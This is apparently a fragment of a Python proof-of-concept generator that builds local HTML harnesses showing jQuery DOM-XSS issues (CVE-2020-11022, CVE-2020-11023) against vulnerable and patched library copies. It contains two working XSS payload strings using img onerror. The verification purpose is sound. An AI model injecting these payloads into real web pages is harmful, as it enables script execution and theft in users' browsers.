# Client-side ("dynamic JS library") PoC harnesses.
#
# The Python verifier above runs over HTTP, so for a purely browser-side
# library XSS (jQuery DOM-XSS, etc.) it can only ever return INCONCLUSIVE.
# For those, emit a RUNNABLE HTML harness that loads the detected-vulnerable
# library next to a patched one and demonstrates, differentially, that the old
# version executes markup the native parser and the patched version leave inert.
# Payloads are the public researcher originals; alert(1) -> __fire() so the
# result is machine-readable. Everything runs locally against vendored copies.
# ---------------------------------------------------------------------------

_FIRE = "__fire()"
CLIENT_POCS = {
    "jquery": {
        "label": "jQuery",
        "api": ".html()",
        "fixed_version": "3.5.1",
        "cdn": "https://code.jquery.com/jquery-{v}.min.js",
        # GHSA aliases -> the CVE we key payloads on.
        "aliases": {"GHSA-gxr4-xjj5-5px2": "CVE-2020-11022",
                    "GHSA-jpcq-cgw6-v4j6": "CVE-2020-11023"},
        "advisories": {
            "CVE-2020-11022": {
                "payload": "<style><style /><img src=x onerror=" + _FIRE + ">",
                "mech": "htmlPrefilter rewrites the self-closing &lt;style /&gt;, "
                        "closing the outer style early"},
            "CVE-2020-11023": {
                "payload": "<option><style></option></select><img src=x onerror="
                           + _FIRE + "></style>",
                "mech": "the &lt;option&gt; string is wrapped in &lt;select&gt;, "
                        "whose parsing drops the &lt;img&gt; out of the style"},
        },
    },
}


def _lib_key(library):
    """Map a fingerprinted library name (e.g. 'jquery', '@foo/jquery') to a
    CLIENT_POCS key, or None."""
    name = (library or "").lower()
    for key in CLIENT_POCS:
        if key in name:
            return key
    return None


def client_poc_for(spec: "PocSpec"):
    """Return (key, cfg, matched_cve) when this finding is a known client-side
    library XSS we can demo, else None. matched_cve may be None if the library
    is known but this specific advisory isn't in the table."""
    key = _lib_key(spec.library)
    if not key:
        return None
    cfg = CLIENT_POCS[key]
    ids = [spec.advisory_id] + list(spec.aliases or ())
    matched = None
    for i in ids:
        if not i:
            continue
        cve = cfg["aliases"].get(i, i)
        if cve in cfg["advisories"]:
            matched = cve
            break
    return (key, cfg, matched)


def _ensure_vendor(outdir, filename, url):
    """Make outdir/vendor/<filename> exist: reuse it, else copy a shipped copy
    next to pocgen.py, else fetch from the CDN. Returns True on success."""
    vdir = os.path.join(outdir, "vendor")
    os.makedirs(vdir, exist_ok=True)
    dest = os.path.join(vdir, filename)
    if os.path.exists(dest) and os.path.getsize(dest) > 0:
        return True
    local = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                         "pocs", "vendor", filename)
    if os.path.exists(local):
        shutil.copyfile(local, dest)
        return True
    try:
        with urllib.request.urlopen(url, timeout=30) as r:
            data = r.read()
        if not data:
            return False
        with open(dest, "wb") as f:
            f.write(data)
        return True
    except Exception:  # noqa: BLE001
        return False


